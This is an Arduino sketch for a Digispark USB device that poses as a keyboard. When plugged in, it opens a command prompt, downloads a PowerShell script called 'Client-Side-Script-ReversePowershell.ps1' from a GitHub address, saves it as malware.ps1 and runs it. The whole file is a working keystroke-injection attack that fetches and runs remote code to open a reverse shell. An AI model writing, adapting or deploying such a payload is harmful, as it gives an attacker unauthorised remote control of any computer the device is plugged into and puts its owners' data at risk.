
#include <DigiKeyboard.h>

void setup() {
  // put your setup code here, to run once:
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_RIGHT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("cmd");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("cd / & mkdir win & cd /win & powershell Invoke-WebRequest  -Uri 'https://raw.githubusercontent.com/GitSimonVetter/GFS_Frenzen/refs/heads/main/Commad/1_Befehl%20bestehende%20Connection/Client-Side-Script-ReversePowershell.ps1' -OutFile malware.ps1");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.println(".\malware.ps1");
  DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
}

void loop() {
  // put your main code here, to run repeatedly:
  // Usless
}
